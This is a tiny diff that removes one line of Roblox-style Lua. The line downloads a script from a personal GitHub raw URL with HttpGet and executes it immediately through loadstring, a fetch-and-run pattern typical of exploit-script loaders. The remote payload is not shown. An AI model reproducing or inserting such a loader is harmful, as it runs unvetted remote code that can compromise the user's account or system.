@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/pedrosempai/Ihigihigihihiih/refs/heads/main/e58ea42722cec732.lua.txt"))()
